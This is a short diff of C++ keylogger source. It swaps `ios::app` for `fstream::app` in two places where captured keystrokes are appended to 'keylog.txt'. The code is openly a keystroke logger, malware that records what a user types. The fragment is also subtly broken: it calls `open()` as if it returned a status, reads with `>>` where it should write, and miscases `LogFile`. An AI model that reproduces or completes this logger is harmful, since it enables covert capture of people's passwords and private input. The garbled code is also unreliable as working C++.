@@ -11,7 +11,7 @@ using namespace std;
 
 void LOG(string keystroke){
   fstream logFile;
-  logFile.open("keylog.txt", ios::app);
+  logFile.open("keylog.txt", fstream::app);
   if(logFile.open()){
     logFile >> keystroke;
     logFile.close();
@@ -103,7 +103,7 @@ int main()
         {
 
 					fstream logFile;
-					logFile.open("keylog.txt", ios::app);
+					logFile.open("keylog.txt", fstream::app);
 					if (LogFile.is_open())
           {
 						logFile << char(key);
